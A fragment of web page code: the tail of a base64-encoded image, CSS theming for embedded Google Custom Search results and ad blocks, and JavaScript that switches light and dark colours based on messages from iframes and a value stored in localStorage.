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);--path:polygon(6px 0,4.31px 3.98px,0 4.34px,3.28px 7.18px,2.29px 11.4px,6px 9.16px,9.71px 11.4px,8.72px 7.18px,12px 4.34px,7.69px 3.98px,6px 0,20px 0,18.31px 3.98px,14px 4.34px,17.28px 7.18px,16.29px 11.4px,20px 9.16px,23.71px 11.4px,22.72px 7.18px,26px 4.34px,21.69px 3.98px,20px 0,34px 0,32.31px 3.98px,28px 4.34px,31.28px 7.18px,30.29px 11.4px,34px 9.16px,37.71px 11.4px,36.72px 7.18px,40px 4.34px,35.69px 3.98px,34px 0,48px 0,46.31px 3.98px,42px 4.34px,45.28px 7.18px,44.29px 11.4px,48px 9.16px,51.71px 11.4px,50.72px 7.18px,54px 4.34px,49.69px 3.98px,48px 0,62px 0,60.31px 3.98px,56px 4.34px,59.28px 7.18px,58.29px 11.4px,62px 9.16px,65.71px 11.4px,64.72px 7.18px,68px 4.34px,63.69px 3.98px,62px 0);--favicon-light:#dadce0;--favicon-dark:#9aa0a6;--rating-dark:#9e9e9e;--rating-light:#5e5e5e;--background-light:#fff;--background-dark:#202020;--text-light:#202124;--text-dark:#dadce0;--border-light:#dadce0;--border-dark:#313335;--blue-light:#1a0dab;--blue-dark:#99c3ff;--gray-light:#4d5156;--gray-dark:#bdc1c6;--gray2-light:#fff;--gray2-dark:#303134;--inputtext-light:rgba(0, 0, 0, 0.87);--inputtext-dark:#e8eaed;--logo-light:var(--logo_light);--logo-dark:var(--logo_dark);--activenav-light:#1f1f1f;--activenav-dark:#e8e8e8;--mainnavlink-light:#70757a;--mainnavlink-dark:#9aa0a6;--site-link-border-light:#dadce0;--site-link-border-dark:#313335;--site-link-a-light:#1f1f1f;--site-link-a-dark:#e8e8e8;--site-link-arrow-light:#5e5e5e;--site-link-arrow-dark:#9e9e9e;--site-link-star-yellow:#fdd663;--site-link-star-gray:#80868b;--site-link-border2:#d2d2d2;--site-link-hover-bg:#ecf2fc;--favicon:var(--favicon-color, var(--favicon-light));--rating:var(--rating-color, var(--rating-light));--background:var(--background-color, var(--background-light));--text:var(--text-color, var(--text-light));--gray:var(--gray-color, var(--gray-light));--gray2:var(--gray2-color, var(--gray2-light));--blue:var(--blue-color, var(--blue-light));--border:var(--border-color, var(--border-light));--inputtext:var(--inputtext-color, var(--inputtext-light));--logo:var(--logo-color, var(--logo-light));--activenav:var(--activenav-color, var(--activenav-light));--mainnavlink:var(--mainnavlink-color, var(--mainnavlink-light));--site-link-border:var(--site-link-border-color,var(--site-link-border-light));--site-link-a:var(--site-link-a-color, var(--site-link-a-light));--site-link-arrow:var(--site-link-arrow-color, var(--site-link-arrow-light))}._domain a,._title a{text-decoration:none;color:inherit;cursor:pointer}.gsc-control-cse,.gsc-results .gsc-imageResult,.gsc-webResult.gsc-result{background-color:var(--background)!important;border-color:var(--background)!important;padding:14px 0!important}.gsc-control-cse .gsc-above-wrapper-area,.gsc-control-cse .gsc-tabsArea,.gsc-results .gsc-imageResult .gsc-above-wrapper-area,.gsc-results .gsc-imageResult .gsc-tabsArea,.gsc-webResult.gsc-result .gsc-above-wrapper-area,.gsc-webResult.gsc-result .gsc-tabsArea,div.gsc-adBlock{border-bottom:1px solid var(--background)}div.gsc-tabsArea{border-bottom:1px solid var(--border)!important}.gsc-tabsArea .gsc-refinementHeader.gsc-refinementhInactive,.gsc-tabsArea .gsc-tabHeader.gsc-tabhInactive{color:var(--mainnavlink);background-color:var(--background)}.gsc-positioningWrapper .gsc-tabHeader.gsc-tabhActive{color:var(--text)!important;border-color:var(--activenav)!important;background-color:var(--background)!important}#adBlock .styleable-title,.gsc-expansionArea .gsc-result .gs-title{font-size:20px;line-height:26px;text-decoration:none;color:var(--blue);margin-bottom:4px}.gsc-input-box,.gsc-input-box-focus,.gsc-input-box-hover,input.gsc-input{background-color:var(--gray2);color:var(--inputtext)}.search-box #cse{padding-left:30px}.gsc-search-box .gsc-search-box,.gsc-search-box input.gsc-input{background-color:var(--gray2)!important}.gsc-search-box table.gsc-search-box:hover{outline-color:#fff0}.search-box::before{content:"";background-image:var(--logo);background-size:cover;width:92px;height:30px;position:absolute}#adBlock img[loading=lazy][role=none],.search-box>img{opacity:0}div.gsc-result-info{color:var(--gray)}.ele_head,.ele_head ._head{display:flex;align-items:center;flex-flow:row wrap;background:var(--background)}.ele_head ._favicon-img{margin-right:12px;border:1px solid var(--favicon);background-color:var(--background-light);border-radius:50%;object-fit:cover}.ele_head ._text{display:flex;flex-flow:row wrap;color:var(--text)}._title::first-letter{text-transform:uppercase}.ele_head ._title{font-size:14px;line-height:20px;color:var(--text);flex:1 100%}.ele_head ._domain{line-height:18px;color:var(--gray);font-size:12px;display:flex}.ele_head .v_ellipsis{width:18px;margin-top:auto;height:18px;line-height:18px;margin-left:5px;display:block}.ele_head .v_ellipsis svg{display:block;width:100%;height:100%;fill:var(--gray)}#adBlock .styleable-title:hover,.gsc-expansionArea .gsc-result a.gs-title:hover{text-decoration:underline}.gsc-expansionArea .gsc-result .gs-title{padding-top:5px}#adBlock .exp-sitelinks-container{padding-left:16px}#adBlock .styleable-title{padding-top:6px;max-width:640px;overflow:hidden;white-space:nowrap;text-overflow:ellipsis}#adBlock .styleable-description{font-size:14px;line-height:1.58;color:var(--gray)}#adBlock .sponsored_text{color:var(--text);font-size:14px;font-weight:700;flex:1 100%;margin-right:8px;margin-bottom:8px;line-height:20px}#adBlock .styleable-rootcontainer{margin-bottom:20px;color:var(-sub)}#adBlock .si14{margin-left:0}#adBlock .sitelinksLeftColumn .si15,#adBlock .sitelinksRightColumn .si15{line-height:1.7}#adBlock .si70{padding-left:0}#adBlock .si72{color:var(--gray);font-size:14px;line-height:20px}#adBlock .si71{font-size:20px}#adBlock .si15,#adBlock .sitelinksTextContainer .si15{margin-top:8px;border:1px solid var(--site-link-border2);border-radius:9999px;padding:0 12px;position:relative;display:inline-flex;justify-self:center;align-items:center;height:30px;font-size:12px}#adBlock .sitelinksTextContainer .si15+.si15{margin-left:10px}#adBlock .si15:hover,#adBlock .sitelinksTextContainer .si15:hover{text-decoration:none;background-color:var(--site-link-hover-bg)}#adBlock .si15,#adBlock .si71{color:var(--blue);line-height:1.7}#adBlock .sitelinksTextContainer .sitelinksLeftColumn,#adBlock .sitelinksTextContainer .sitelinksRightColumn{flex-direction:row!important;padding-inline:0!important}#adBlock .sitelinksTextContainer .sitelinksLeftColumn a+a,#adBlock .sitelinksTextContainer .sitelinksRightColumn a+a{padding-left:15px;position:relative}#adBlock .sitelinksTextContainer .sitelinksLeftColumn a+a::before,#adBlock .sitelinksTextContainer .sitelinksRightColumn a+a::before{display:none;content:"·";position:absolute;left:6px;color:#fff;width:1px;height:1px;background:var(--text);top:12px}#adBlock .si16{display:none}#adBlock .sitelinksTextContainer .sitelinksRightColumn{padding-left:15px!important;position:relative}#adBlock .sitelinksTextContainer .sitelinksRightColumn::before{display:none;content:"·";position:absolute;left:6px;color:#fff0;width:1px;height:1px;background:var(--text);top:12px;line-height:1.7}#adBlock .si21,.div:has(> .styleable-visurl){display:none}.gsc-results{padding:6px 0}#adBlock .styleable-description+div .si18,.gsc-results .gs-title>a,.gsc-results .gs-title>a b{color:var(--blue)!important}.gsc-results .gs-bidi-start-align.gs-snippet,.gsc-results .gs-bidi-start-align.gs-snippet b,.gsc-results .gs-visibleUrl{color:var(--gray)!important}.gsc-results .gsc-webResult .gsc-url-top{display:none}.gsc-tabData.gsc-tabdActive{margin-top:-25px}.si1,.si11,.si3{color:var(--rating)!important;line-height:1.58!important;font-size:14px!important}#adBlock img[loading=lazy][role=none]+.div{clip-path:var(--path);color:var(--site-link-star-yellow);background-color:currentColor;display:inline-block;background-image:none!important;height:11.4px;margin:2px 0}#adBlock img[loading=lazy][role=none]+.div::after,#adBlock img[loading=lazy][role=none]+.div::before{content:"";position:absolute;clip-path:var(--path);height:12px}#adBlock img[loading=lazy][role=none]+.div::before{width:inherit;background:var(--site-link-star-yellow)}#adBlock img[loading=lazy][role=none]+.div::after{width:68px;background:var(--site-link-star-gray);z-index:-1}#adBlock .exp-sitelinks-container{margin-top:12px;width:652px}#adBlock .exp-sitelinks-container>div{border-top:1px solid var(--site-link-border);width:100%;padding-top:10px;position:relative}#adBlock .exp-sitelinks-container>div ::before{content:"";mask-image:url('data:image/svg+xml,<svg focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="%239E9E9E" d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"></path></svg>');position:absolute;width:24px;height:24px;right:0;top:0;bottom:0;margin:auto;background:var(--site-link-arrow)}#adBlock .exp-sitelinks-container .si15,#adBlock .exp-sitelinks-container .si71{color:var(--blue);font-size:18px}#adBlock .styleable-description+:not(a){color:var(--text)!important}`;

            injectCSS(styles);

            function setCSSProperty(property, value) {
            document.documentElement.style.setProperty(property, value);
            }
            function updateBgTheme(backgroundValues) {
            if (backgroundValues == "rgb(255, 255, 255)") {
                setCSSProperty("--background", "var(--background-light)");
                setCSSProperty("--text", "var(--text-light)");
                setCSSProperty("--gray", "var(--gray-light)");
                setCSSProperty("--gray2", "var(--gray2-light)");
                setCSSProperty("--blue", "var(--blue-light)");
                setCSSProperty("--border", "var(--border-light)");
                setCSSProperty("--inputtext", "var(--inputtext-light)");
                setCSSProperty("--logo", "var(--logo-light)");
                setCSSProperty("--activenav", "var(--activenav-light)");
                setCSSProperty("--mainnavlink", "var(--mainnavlink-light)");
                setCSSProperty("--site-link-border", "var(--site-link-border-light)");
                setCSSProperty("--site-link-a", "var(--site-link-a-light)");
                setCSSProperty("--site-link-arrow", "var(--site-link-arrow-light");
                setCSSProperty("--site-link-border2", "#d2d2d2");
                setCSSProperty("--site-link-hover-bg", "#ecf2fc");
                setCSSProperty("--favicon", "var(--favicon-light)");
                setCSSProperty("--rating", "var(--rating-light)");
            } else {
                setCSSProperty("--background", backgroundValues);
                setCSSProperty("--text", "#dadce0");
                setCSSProperty("--gray", "#bdc1c6");
                setCSSProperty("--gray2", "#303134");
                setCSSProperty("--blue", "#99c3ff");
                setCSSProperty("--border", "#313335");
                setCSSProperty("--inputtext", "#e8eaed");
                setCSSProperty("--logo", "var(--logo-dark)");
                setCSSProperty("--activenav", "#e8e8e8");
                setCSSProperty("--mainnavlink", "#9aa0a6");
                setCSSProperty("--site-link-border", "#313335");
                setCSSProperty("--site-link-a", "#e8e8e8");
                setCSSProperty("--site-link-arrow", "#9e9e9e");
                setCSSProperty("--site-link-border2", "#444746");
                setCSSProperty("--site-link-hover-bg", "#2a2d31");
                setCSSProperty("--favicon", "var(--favicon-dark)");
                setCSSProperty("--rating", "var(--rating-dark)");
            }
            }

            if (localStorage.getItem("background")) {
            logDebug("LocalStorage BG = " + localStorage.getItem("background"));
            updateBgTheme(localStorage.getItem("background"));
            }

            let Iframe2BgReceived = false;

            window.addEventListener("message", (event) => {
            logDebug("2nd Iframe Messages = ", event);
            if (event.data.bg && !Iframe2BgReceived) {
                Iframe2BgReceived = true;
                const bg = event.data.bg;
                updateBgTheme(bg);
                localStorage.setItem("background", bg);
                event.source.postMessage("MsgOk", event.origin);
                sendUntilResponse({ bg }, 50);
                logDebug("Dark Mode 1st iframe bg =" + bg);
            } else {
                event.source.postMessage("MsgOk", event.origin);
                logDebug("Light Mode received from ", event.source);
            }
            });
        }
    })();